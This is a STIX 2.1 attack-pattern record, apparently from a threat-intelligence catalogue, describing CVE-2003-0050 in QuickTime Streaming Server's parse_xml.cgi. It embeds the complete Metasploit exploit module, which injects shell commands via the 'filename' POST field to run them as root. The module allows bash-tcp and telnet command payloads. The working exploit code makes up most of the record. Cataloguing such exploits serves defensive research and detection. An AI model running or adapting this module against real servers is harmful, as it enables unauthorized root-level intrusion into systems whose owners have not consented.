{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ad5337a-b153-4a4e-9543-17e6d08e0348",
    "created": "2024-08-14T17:12:17.524898Z",
    "modified": "2024-08-14T17:12:17.524902Z",
    "name": "QuickTime Streaming Server parse_xml.cgi Remote Execution",
    "description": " The QuickTime Streaming Server contains a CGI script that is vulnerable to metacharacter injection, allow arbitrary commands to be executed as root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/qtss_parse_xml_exec.rb",
            "external_id": "qtss_parse_xml_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0050"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'QuickTime Streaming Server parse_xml.cgi Remote Execution',\n      'Description'    => %q{\n          The QuickTime Streaming Server contains a CGI script that is vulnerable\n        to metacharacter injection, allow arbitrary commands to be executed as root.\n        },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '10562'],\n          [ 'BID', '6954' ],\n          [ 'CVE', '2003-0050' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-02-24'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(1220)\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Sending post request with embedded command...\")\n\n    data = \"filename=\" + Rex::Text.uri_encode(\";#{payload.encoded}|\")\n\n    response = send_request_raw({\n      'uri'\t  => \"/parse_xml.cgi\",\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n      {\n        'Content-Type'\t => 'application/x-www-form-urlencoded',\n        'Content-Length' => data.length,\n      }\n    }, 3)\n\n    # If the upload worked, the server tries to redirect us to some info\n    # about the file we just saved\n    if response and response.code != 200\n      print_error(\"Server returned non-200 status code (#{response.code})\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-02-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}